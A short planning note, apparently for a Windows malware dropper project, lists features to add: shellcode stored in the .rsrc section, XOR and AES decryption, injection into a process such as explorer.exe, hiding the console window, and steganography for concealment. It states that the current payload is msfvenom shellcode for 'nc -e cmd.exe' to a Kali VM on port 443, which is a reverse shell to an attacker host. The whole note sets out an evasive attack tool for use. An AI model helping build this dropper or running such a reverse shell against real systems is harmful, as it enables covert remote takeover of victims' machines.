Final dropper should:
    - Include shellcode
    - Extract shellcode from .rsrc
    - Decrypt shellcode (XOR and AES)
    - Inject shellcode into some process (explorer.exe?)
    - Get rid of console window popup
    - Use stenography

Our shellcode currently is:
    - Msfvenom-generated code for "nc -e cmd.exe [KALI VM IP] 443"
